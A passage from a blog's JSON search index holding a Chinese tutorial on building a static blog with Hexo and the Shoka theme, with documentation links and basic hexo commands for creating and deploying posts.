早教级别教你使用Hexo和GitHub Pages搭建属于自己的静态博客 - 搭建博客 - 前端设计 | MyBlog &#x3D; MqyGalaxy | Blog &#x3D; 爱好ACG的温馨小窝 (moeqy.com) Step.3 界面显示 - Theme Shoka Documentation - 二进制杂谈 - 计算机科学 | Yume Shoka &#x3D; 優萌初華 &#x3D; 有夢書架 (lostyu.me) 3.Shoka的一些配置和说明我们已经完成 Hexo 默认安装以及部署，现在我们使用其他主题加载我们的个人博客。 Shoka 主题相关链接如下。 123456主题主页：https://shoka.lostyu.me/文档说明：https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/基本配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/config/页面配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/依赖插件: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/dependents/ 4.发布博客 写一篇文章，步骤参考 创建文章其中 title 为文章的标题。 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;title&quot; 执行完成后 hexo 会根据目录下 scaffolds&#x2F;post.md，在 source&#x2F;_posts 文件夹下创建一个名为 title.md 的文件。 123 --- title: hello-worlddate: 2023-11-23 01:03:24tags: --- balabala..... 接下来就可以正式开始写文章了。 部署文章命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123hexo g -chexo shexo d 执行完成之后再次访问就可以看到内容了～","path":"基于hexo和shoka的博客使用教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}],"categories":[],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"},{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}